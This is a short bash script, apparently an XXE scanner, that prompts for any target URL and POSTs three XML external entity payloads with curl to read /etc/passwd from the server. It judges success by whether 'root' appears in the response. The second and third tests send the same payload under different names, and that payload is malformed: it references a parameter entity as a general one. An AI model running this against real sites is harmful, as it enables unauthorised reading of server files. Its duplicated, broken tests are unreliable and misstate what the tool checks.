#!/bin/bash

# Function to print text in color
print_color() {
    case "$2" in
        "red")
            echo -e "\e[91m$1\e[0m"
            ;;
        "green")
            echo -e "\e[92m$1\e[0m"
            ;;
        "blue")
            echo -e "\e[94m$1\e[0m"
            ;;
        *)
            echo "$1"
            ;;
    esac
}

# Function to test XXE vulnerability
test_xxe_vulnerability() {
    target_website="$1"
    print_color "Testing for XXE vulnerability..." "blue"
    
    # Test 1: Basic XXE Injection
    response=$(curl -s -X POST -d "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>" "$target_website")
    if [[ $response == *"root"* ]]; then
        print_color "Basic XXE injection successful. The target website is vulnerable to XXE!" "red"
    else
        print_color "Basic XXE injection failed. The target website might not be vulnerable." "green"
    fi
    
    # Test 2: External Entity Declaration
    print_color "Testing for XXE vulnerability using external entity declaration..." "blue"
    response=$(curl -s -X POST -d "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY test \"&xxe;\">]><foo>&test;</foo>" "$target_website")
    if [[ $response == *"root"* ]]; then
        print_color "External entity declaration successful. The target website is vulnerable to XXE!" "red"
    else
        print_color "External entity declaration failed. The target website might not be vulnerable." "green"
    fi
    
    # Test 3: Parameter Entity Injection
    print_color "Testing for XXE vulnerability using parameter entity injection..." "blue"
    response=$(curl -s -X POST -d "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY test \"&xxe;\">]><foo>&test;</foo>" "$target_website")
    if [[ $response == *"root"* ]]; then
        print_color "Parameter entity injection successful. The target website is vulnerable to XXE!" "red"
    else
        print_color "Parameter entity injection failed. The target website might not be vulnerable." "green"
    fi
}

# Main function
main() {
    # Prompt user for target website URL
    read -p "Enter your target website URL: " target_url

    # Test for XXE vulnerability
    test_xxe_vulnerability "$target_url"
}

# Call main function
main
